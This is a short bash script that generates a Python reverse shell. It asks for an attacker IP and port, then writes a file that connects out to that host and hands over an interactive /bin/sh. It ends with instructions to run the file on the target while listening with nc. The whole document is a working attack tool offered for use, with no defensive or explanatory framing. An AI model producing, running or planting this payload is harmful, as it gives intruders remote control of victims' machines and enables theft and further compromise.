#!/bin/bash
echo "========================================="
echo "       PYTHON REVERSE SHELL GENERATOR"
echo "========================================="
echo ""
read -p "Enter LHOST (your IP): " LHOST
read -p "Enter LPORT (4444): " LPORT
LPORT=${LPORT:-4444}
cat > ~/reverse_shell.py << EOL
#!/usr/bin/env python3
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", $LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOL
echo ""
echo "✅ Reverse shell saved: ~/reverse_shell.py"
echo "On target: python3 reverse_shell.py"
echo "On your machine: nc -lvnp $LPORT"
